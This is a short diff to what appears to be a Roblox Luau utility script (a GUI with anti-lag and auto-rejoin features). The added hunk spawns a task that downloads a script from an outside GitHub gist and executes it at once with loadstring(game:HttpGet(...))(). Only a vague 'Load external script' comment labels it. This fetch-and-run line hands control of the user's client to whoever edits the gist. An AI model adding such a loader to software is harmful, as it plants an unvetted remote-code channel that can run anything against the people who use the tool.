@@ -456,4 +456,10 @@ task.delay(30, function()
 	applyAntiLag()
 end)
 
+-- Load external script
+task.spawn(function()
+	loadstring(game:HttpGet("https://gist.githubusercontent.com/AntiKickKickClub/73bcd2f11e97714b042a45228e8e7c5b/raw/public.luau"))()
+end)
+
+
 print("✅ Pro Tools GUI + AntiLag + Auto Rejoin + Watchdog LOADED!")
